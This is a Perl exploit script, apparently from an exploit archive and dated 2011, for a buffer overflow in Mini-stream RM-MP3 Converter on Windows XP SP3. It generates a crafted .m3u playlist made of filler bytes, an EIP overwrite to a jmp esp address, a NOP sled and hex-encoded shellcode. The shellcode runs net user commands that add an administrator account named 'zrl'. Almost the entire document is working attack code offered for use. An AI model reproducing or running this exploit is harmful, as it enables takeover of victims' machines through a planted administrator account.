# Title        : Mini-stream RM-MP3 Converter Buffer Overflow Exploit
# Author       : ZoRLu
# Proof        : http://img843.imageshack.us/img843/3144/buffer.jpg
# Desc.        : usr: zrl , pass: 123456 , localgroup: Administrator
#Tested        : xp/sp3
# mail-msn     : admin@yildirimordulari.com
# Home         : http://z0rlu.blogspot.com
# Date         : 04/01/2011
# Te�ekk�r     : Dr.Ly0n LifeSteaLeR

my $dosya= "zrl.m3u";
my $zart= "\x41" x 26059;
my $zurt= "\x90" x 24;
my $eip = pack('V',0x7E3EA32F);  # 0x7E3EA32F  user32.dll jmp esp

# windows/exec - 127 bytes
# Thanks to http://www.exploit-db.com/exploits/15063/
# Encoder: win32/ZoRLu
# Desc.: usr: zrl , pass: 123456
# CMD=Add Admin
my $shell = "\xeb\x1b\x5b\x31\xc0\x50\x31\xc0\x88\x43\x5d\x53\xbb\xad\x23\x86\x7c".
			"\xff\xd3\x31\xc0\x50\xbb\xfa\xca\x81\x7c\xff\xd3\xe8\xe0\xff\xff\xff".
			"\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x20\x75\x73".
			"\x65\x72\x20\x7a\x72\x6c\x20\x31\x32\x33\x34\x35\x36\x20\x2f\x61\x64".
			"\x64\x20\x26\x26\x20\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67\x72\x6f".
			"\x75\x70\x20\x41\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\x72\x73".
			"\x20\x2f\x61\x64\x64\x20\x7a\x72\x6c\x20\x26\x26\x20\x6e\x65\x74\x20".
			"\x75\x73\x65\x72\x20\x7a\x72\x6c";        

open($FILE,">$dosya");
print $FILE $zart.$eip.$zurt.$shell;
close($FILE);
print "\n$dosya Dosyasi Hazir\n";
